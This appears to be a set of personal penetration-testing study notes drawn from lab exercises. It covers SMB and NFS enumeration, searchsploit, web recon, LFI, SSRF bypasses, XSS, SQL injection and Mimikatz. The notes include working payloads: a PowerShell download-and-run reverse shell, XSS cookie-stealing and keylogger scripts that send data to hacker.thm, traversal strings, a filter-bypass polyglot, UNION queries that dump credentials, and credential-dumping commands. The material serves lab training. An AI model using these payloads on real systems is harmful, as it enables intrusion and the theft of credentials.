Here's one final hint about using smbclient. Sometime you might need to use smbclient on someone else's Linux system. If the system's owner has never used smbclient and hasn't created the smb.conf file, Linux can't check smb.conf for the WINS server's location, and consequently smbclient often can't find the Win2K or NT server that you're trying to connect to. (For an explanation of the smb.conf file, see "Connecting Linux Workstations to Windows 2000 and NT Servers.")

You can, of course, create an smb.conf file. But if you don't want to do that much work, you can lead smbclient by the nose to your Win2K or NT server with the -W and -I options. The -W option lets you enter a domain's name, and the -I option lets you specify the server's IP address. So, using my earlier example, if I knew that \\BIGSERVE had an IP address of 200.200.200.10 and that my usermark account was in the domain GUYS, I could invoke smbclient with the command

smbclient //bigserve/plans -I   200.200.200.10 -W guys -U usermark%swordfish
Download recursively
  smbget -R smb://10.10.175.107/Anonymous

#]#]#]#]Pending 
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
--=-=-=-=-=-=
searchsploit 
searchsploit -t java #Por titulo
searchsploit -p 39166 #Copia al portapapeles
searchsploit -m 39166 #Ademas copia al directorio actual 
searchsploit -x 39166 #Examinar
searchsploit -x --nmap resultado.xml
searchsploit ubuntu 14.04 -w #Busqueda en exploit.db 
searchsploit ubuntu 14.10 -w --exclude="Linux Kernel"
searchsploit -c ProFTPD 1.3.5 #Case sensitive
-=-=-=-=-=-=-=
HFS (testing)
In the GET parameter
/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+ping+10.10.14.10.}
listen with tcpdump -i tun0 icmp
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
#URL encode the payload
#Transfer files from Windows to Linux. If we are using cmd
powershell -c "Invoke-WebRequest -Uri 'http://10.8.50.72:8000/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"
powershell -c wget "http://10.10.118.24/winPEAS.exe" -outfile "winPEAS.exe"
#Windows escalation privilege 
  PS C:\Users\bill\Downloads> . .\PowerUp.ps1
  PS C:\Users\bill\Downloads> Invoke-AllChecks
-=-=-=-=-=-=-=-
Web Hacking

#View source code
Links to different pages in HTML are written in anchor tags ( these are HTML elements that start with <a ), and the link that you'll be directed to is stored in the href attribute.

#Against a paywall
The style we're interested in is the display: block. If you click on the word block, you can type a value of your own choice. Try typing none, and this will make the box disappear, revealing the content underneath it and a flag. If the element didn't have a display field, you could click below the last style and add in your own

#Using breakpoints
This little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called breakpoints. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.

#Robots.txt
The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.

#Sitemap.xml
Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.

#favicon
do a curl to compare the hash against OWASP favicon database (https://wiki.owasp.org/index.php/OWASP_favicon_database)
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum

#HTTP headers
curl http://10.10.125.127 -I

#OSINT
Filter
	Example
	Description

site
	site:tryhackme.com
	returns results only from the specified website address
        -site:www.tryhackme.com
        exclude any links to www.tryhackme.com. It shows us only subdomain names belonging to domain.com

inurl
	inurl:admin
	returns results that have the specified word in the URL

filetype
	filetype:pdf
	returns results which are a particular file extension

intitle
	intitle:admin
	returns results that contain the specified word in the title

others
inurl:"ViewerFrame?Mode=" will find public web cameras.
Another useful search is following intitle:index.of followed by a search keyword. This can give a list of files on the servers. For example, intitle:index.of mp3 will give all the MP3 files available on various types of servers. 

#OSINT - Wayback Machine
The Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.

#S3 Buckets
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

#Automated
dirb http://10.10.125.127/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.TXT
gobuster dir --url http://10.10.125.127/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

-=-=-=-=-
Subdomain enumeration
#SSL/TLS certificates
When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used
  https://crt.sh/ 

#DNS Bruteforce 
dnsrecon -t brt -d acmeitsupport.thm

#Virtual hosts 
Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host:FUZZ.acmeitsupport.thm" -u http://10.10.80.215 -fs 2395


#Authentication Bypass 
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.70.209/customers/signup -mr "username already exists"

#Brute force 
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.70.209/customers/login -fc 200

#Logic flaws
In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.


The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
curl 'http://10.10.70.209/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
curl 'http://10.10.70.209/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'

-=-=-=-=-=-
Cookie tampering
#Plain text
curl -H "Cookie: logged_in=true; admin=true" http://10.10.70.209/cookie-test
#Hashing
#encoding
Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.


Take the below data as an example which is set by the web server upon logging in:

Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.

-=-=-=-=-=-=-=
IDOR
giving you access to data that you shouldn't have.

-=--=-=-=-
File inclusion
#Path traversal
/etc/passwd or C:\boot.ini C:\windows\win.ini

Common OS files to test
Location	Description

/etc/issue	contains a message or system identification to be printed before the login prompt.

/etc/profile	controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
/proc/version	specifies the version of the Linux kernel

/etc/passwd	has all registered user that has access to a system

/etc/shadow	contains information about the system's users' passwords

/root/.bash_history	contains the history commands for root user

/var/log/dmessage	contains global system messages, including the messages that are logged during system startup

/var/mail/root	all emails for root user
/root/.ssh/id_rsa	Private SSH keys for a root or any known valid user on the server
/var/log/apache2/access.log	the accessed requests for Apache  webserver
C:\boot.ini	contains the boot options for computers with BIOS firmware

=============
#LFI
Examples wih PHP
1. It works because there isn't a directory specified in the include function and no input validation.
http://webapp.thm/get.php?file=/etc/passwd
<?PHP 
	include($_GET["lang"]);
?>

2. If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.
<?PHP 
	include("languages/". $_GET['lang']); 
?>

3. Using null bytes
Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
The %00 trick is fixed and not working with PHP 5.3.4 and above.

4.In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00

5. The developer starts to use input validation by filtering some keywords. The web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass,

6. The developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd

========
#RFI
An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

host vcs.fsf.org
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa

ssh -oHostKeyAlgorithms=+ssh-dss -i id_rsa root@<ip>
  OpenSSH since 7.0 doesn't accept hostkey ssh-dss and you must add it, similarly since 8.8 it doesn't use client ssh-rsa and you must add that with -oPubkeyAcceptedAlgorithms=+ssh-rsa.

-=-=-=-=-
SSRF
1. Modify URL
  Hacker request
    http://website.thm/stock?url=http://api.website.thm/api/user 
2. Path traversal 
    http://website.thm/stock?url=/../user
3. Server subdomain to wich the request is made
    http://website.thme/stock?server=api.website.thm/api/user&x=&id=123
    the payload ending in &x= is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a paramter (?x=) on the query string

4. Change a value like in an avatar election with a payload like x/../private being private a directory interesting

#Defeating common SSRF 
Deny list
Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.

Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254


Allow List
An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.


Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.

-=-=-=-=-=-=-=
XSS 
PoC
  <script>alert('XSS');</script>
  <marquee>testing</marquee>
Stealing cookie
  <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
    The </textarea> tag closes the textarea field. 
    The <script>tag opens open an area for us to write JavaScript.
    The fetch() command makes an HTTP request.
    {URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
    ?cookie= is the query string that will contain the victim's cookies.
    btoa() command base64 encodes the victim's cookies.
    document.cookie accesses the victim's cookies for the Acme IT Support Website.
    </script>closes the JavaScript code block.
Keylogger
  <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
  <script>user.changeEmail('attacker@hacker.thm');</script>

-----
Stored XSS
the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example Scenario:
  A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

-----
Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example Scenario:

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

Potential Impact:

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
xsshunter is a popular tool

-----
Reflected XSS
Example scenario
  A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.
  https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>


-----
Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

Example Scenario:
  The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().


-----
Testing 
You can see your name reflected inside the value attribute of the input tag. "><script>alert('THM');</script>
With "> we close the value attribute

Other
  You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code

<sscriptcript>alert('THM');</sscriptcript>
/images/cat.jpg" onload="alert('THM');

Polyglots:


An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e



-=-=-=-=-=-=-=-=
Command injection
The shell operators ;, |, & and && will combine two (or more) system commands and execute them both
sleep[in Linux]=timeout[in Windows]
https://github.com/payloadbox/command-injection-payload-list

--=-=-=-=-=
=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=

SQL
A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite

Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch

It's worth noting that SQL syntax is not case sensitive.

Inside mysql (with credentials). An example
mysql -u wordpress -p 
show databases;
use phpmyadmin;
show tables;
describe usernames_table;

Example:
  select * from users;
    The semicolon at the end tells the database that this is the end of the query.  

  select * from users LIMIT 1;
    This query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.

  select * from users where username='admin';

  select * from users where username like 'a%';
    This returns any rows with username beginning with the letter a.

  select * from users where username like '%n';
    This returns any rows with username ending with the letter n.

  select * from users where username like '%mi%';
    This returns any rows with a username containing the characters mi within them.

  SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
    The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. 

  insert into users (username,password) values ('bob','password123');
    The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns

  update users SET username='root',password='pass123' where username='admin';
    The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

  delete from users where username='martin';
    The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

  SELECT * from blog where id=1 and private=0 LIMIT 1;
    the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match


-=-=-=-=-=-
SQLi
   Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
  https://website.thm/blog?id=2;--

  Which would then, in turn, produce the SQL statement:
  SELECT * from blog where id=2;-- and private=0 LIMIT 1;
  The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

  SELECT * from blog where id=2;--
  Which will return the article with an id of 2 whether it is set to public or notes

-----
In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


Union-Based SQL Injection
  This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

  The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

  Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 

  The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:
  1 UNION SELECT 1

  This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:
  1 UNION SELECT 1,2

  Same error again, so let's repeat by adding another column:
  1 UNION SELECT 1,2,3

  Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.
  0 UNION SELECT 1,2,3

  You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:
  0 UNION SELECT 1,2,database()
  You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.

  Our next query will gather a list of tables that are in this database.
  0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

  There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


  As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.
  0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

  This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.

  The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.
  0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users


  Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.


###Blind SQLi - Authentication Bypass

Authentication Bypass
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 
Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

  We could use ' or 1=1;--

###Blind SQLi - Boolean based
admin123' UNION SELECT 1,2,3 where database() like '%';--

We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.

admin123' UNION SELECT 1,2,3 where database() like 's%';--

###Blind SQLi - Time based
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--


-=-=-=-=-=-=
Burpsuite room
#Decoder


URL: It involves exchanging characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). Url encoding is an extremely useful method to know for any kind of web application testing.
For example, let's encode the forward-slash character (/). The ASCII character code for a forward slash is 47. This is "2F" in hexadecimal, making the URL encoded forward-slash %2F.

HTML: Encoding text as HTML Entities involves replacing special characters with an ampersand (&) followed by either a hexadecimal number or a reference to the character being escaped, then a semicolon (;). For example, a quotation mark has its own reference: &quot;. When this is inserted into a webpage, it will be replaced by a double quotation mark ("). This encoding method allows special characters in the HTML language to be rendered safely in HTML pages and has the added bonus of being used to prevent attacks such as XSS (Cross-Site Scripting).

Base64: Another widely used encoding method, base64 is used to encode any data in an ASCII-compatible format. It was designed to take binary data (e.g. images, media, programs) and encode it in a format that would be suitable to transfer over virtually any medium

ASCII Hex: This option converts data between ASCII representation and hexadecimal representation. For example, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each letter in the original data is taken individually and converted from numeric ASCII representation into hexadecimal. For example, the letter "A" in ASCII has a decimal character code of 65. In hexadecimal, this is 41. Similarly, the letter "S" can be converted to hexadecimal 53, and so on.
-=-=-=-=
Mimikatz 
Here are just some of the most popular Mimikatz command and related functionality.

    CRYPTO::Certificates – list/export certificates
    KERBEROS::Golden – create golden/silver/trust tickets
    KERBEROS::List – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.
    KERBEROS::PTT – pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).
    LSADUMP::DCSync – ask a DC to synchronize an object (get password data for account). No need to run code on DC.
    LSADUMP::LSA – Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”
    LSADUMP::SAM – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
    LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
    MISC::AddSid – Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.
    MISC::MemSSP – Inject a malicious Windows SSP to log locally authenticated credentials.
    MISC::Skeleton – Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.
    PRIVILEGE::Debug – get debug rights (this or Local System rights is required for many Mimikatz commands).
    SEKURLSA::Ekeys – list Kerberos encryption keys
    SEKURLSA::Kerberos – List Kerberos credentials for all authenticated users (including services and computer account)
    SEKURLSA::Krbtgt – get Domain Kerberos service account (KRBTGT)password data
    SEKURLSA::LogonPasswords – lists all available provider credentials. This usually shows recently logged on user and computer credentials.
    SEKURLSA::Pth – Pass- theHash and Over-Pass-the-Hash
    SEKURLSA::Tickets – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
    TOKEN::List – list all tokens of the system
    TOKEN::Elevate – impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box
    TOKEN::Elevate /domainadmin – impersonate a token with Domain Admin credentials.


-=-=-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=-=
Passive Recon 
We use whois to query WHOIS records, while we use nslookup and dig to query DNS database records. These are all publicly available records and hence do not alert the target.

We will also learn the usage of two online services:

    DNSDumpster
    Shodan.io
    virustotal

-=-=-=
whois 
 A WHOIS server listens on TCP port 43 for incoming requests. The domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing.

-=-=-=
nslookup 
Query type 	Result
A 	IPv4 Addresses
AAAA 	IPv6 Addresses
CNAME 	Canonical Name
MX 	Mail Servers
SOA 	Start of Authority
TXT 	TXT Records

Purpose 	Commandline Example
Lookup WHOIS record 	whois tryhackme.com
Lookup DNS A records 	nslookup -type=A tryhackme.com
Lookup DNS MX records at DNS server 	nslookup -type=MX tryhackme.com 1.1.1.1
Lookup DNS TXT records 	nslookup -type=TXT tryhackme.com
Lookup DNS A records 	dig tryhackme.com A
Lookup DNS MX records at DNS server 	dig @1.1.1.1 tryhackme.com MX
Lookup DNS TXT records 	dig tryhackme.com TXT

-=-=-=-=-=-=-=-=-=-=
Active Recon
ping

On Linux, traceroute will start by sending UDP datagrams within IP packets of TTL being 1. Thus, it causes the first router to encounter a TTL=0 and send an ICMP Time-to-Live exceeded back. Hence, a TTL of 1 will reveal the IP address of the first router to you. Then it will send another packet with TTL=2; this packet will be dropped at the second router. And so on.

*The number of hops/routers between your system and the target system depends on the time you are running traceroute. There is no guarantee that your packets will always follow the same route, even if you are on the same network or you repeat the traceroute command within a short time.
*Some routers return a public IP address. You might examine a few of these routers based on the scope of the intended penetration testing.
*Some routers don’t return a reply

telnet
telnet 10.10.29.184 80 
  GET / HTTP/1.1 
  host: example

-=-=-=-=-=-=-=
nmap01

We present the different approaches that Nmap uses to discover live hosts. In particular, we cover:

    ARP scan: This scan uses ARP requests to discover live hosts
    ICMP scan: This scan uses ICMP requests to identify live hosts
    TCP/UDP ping scan: This scan sends packets to TCP ports and UDP ports to determine live hosts.

We also introduce two scanners, arp-scan and masscan, and explain how they overlap with part of Nmap’s host discovery.

Starting from bottom to top, we can use:

    ARP from Link Layer
    ICMP from Network Layer
    TCP from Transport Layer
    UDP from Transport Layer

ICMP has many types. ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply).
-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using ARP 
If you want to ping a system on the same subnet, an ARP query should precede the ICMP Echo.

Although TCP and UDP are transport layers, for network scanning purposes, a scanner can send a specially-crafted packet to common TCP or UDP ports to check whether the target will respond. This method is efficient, especially when ICMP Echo is blocked.


There are various ways to discover online hosts. When no host discovery options are provided, Nmap follows the following approaches to discover live hosts:

    When a privileged user tries to scan targets on a local network (Ethernet), Nmap uses ARP requests. A privileged user is root or a user who belongs to sudoers and can run sudo.
    When a privileged user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.
    When an unprivileged user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.

Nmap, by default, uses a ping scan to find live hosts, then proceeds to scan live hosts only. If you want to use Nmap to discover online hosts without port-scanning the live systems, you can issue nmap -sn TARGETS. Let’s dig deeper to gain a solid understanding of the different techniques used.

